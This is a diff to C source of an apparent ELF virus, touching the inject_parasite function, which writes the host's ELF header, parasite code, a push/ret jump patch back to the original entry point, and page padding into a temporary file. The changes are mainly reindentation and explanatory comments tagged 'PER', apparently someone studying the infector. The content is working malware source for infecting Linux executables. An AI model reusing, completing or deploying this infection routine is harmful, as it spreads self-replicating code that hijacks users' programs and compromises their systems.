@@ -337,7 +337,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 	unsigned char *mem = target->mem;
 	unsigned char *parasite = self->mem;
 	char *host = target->path, *protected; 
-	struct stat st;
+	struct stat st; // contains the statistics of the target file
 
 	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));
 
@@ -345,16 +345,16 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
          * end_of_text += p_hdr->p_filesz;
          */ 
-        extern int return_entry_start;
+	extern int return_entry_start;
 
-        if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
-                return -1;
-        
-        /*
-         * Write first 64 bytes of original binary (The elf file header) 
-         * [ehdr] 
-         */
-        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
+	if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
+		return -1;
+	
+	/*
+		* Write first 64 bytes of original binary (The elf file header) 
+		* [ehdr] 
+		*/
+	if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
 		return -1;
         
         /*
@@ -362,11 +362,15 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * [ehdr][virus]
          */
 	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
-        void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
-	int end_code_size = (int)((char *)f2 - (char *)f1);
+    void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
+	int end_code_size = (int)((char *)f2 - (char *)f1); // PER: TODO
+
  	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
-        uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
+    
+	uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3}; 
+	//PER: pushing(0x68) the address jmp_patch[1:5] onto stack and then return(0xc3)
 	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
+	// PER: jmp_patch=[0x68][4 bytes for past entry point][0xc3]
 	/*
 	 * Write parasite up until end_code()
 	 */
@@ -376,13 +380,14 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
 		return -1;
 	}
-	_write(ofd, jmp_patch, sizeof(jmp_patch));
+	_write(ofd, jmp_patch, sizeof(jmp_patch)); //PER: TODO
 	_write(ofd, &parasite[initial_parasite_len + sizeof(jmp_patch)], RODATA_PADDING + (end_code_size - sizeof(jmp_patch)));
   
 	/*
          * Seek to end of tracer.o + PAGE boundary  
          * [ehdr][virus][pad]
-         */
+         * pad = paddingSize-parasiteSize
+		 */
         uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
         if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
 		return -1;
